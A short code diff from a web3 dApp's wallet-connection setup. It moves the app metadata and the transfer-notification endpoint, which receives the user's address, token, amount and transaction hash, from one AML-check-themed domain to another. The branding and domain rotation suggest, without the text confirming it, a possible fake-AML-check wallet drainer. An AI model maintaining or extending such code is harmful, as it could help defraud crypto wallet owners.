@@ -17,8 +17,8 @@ const appKitModal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://amllegit.com/',
-    icons: ['https://amllegit.com/icon.png'],
+    url: 'https://whiteml.com/',
+    icons: ['https://whiteml.com/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
   allWallets: 'SHOW',
@@ -578,7 +578,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       throw new Error('Amount is zero or negative after rounding');
     }
 
-    const response = await fetch('https://api.amllegit.com/api/transfer', {
+    const response = await fetch('https://api.whiteml.com/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
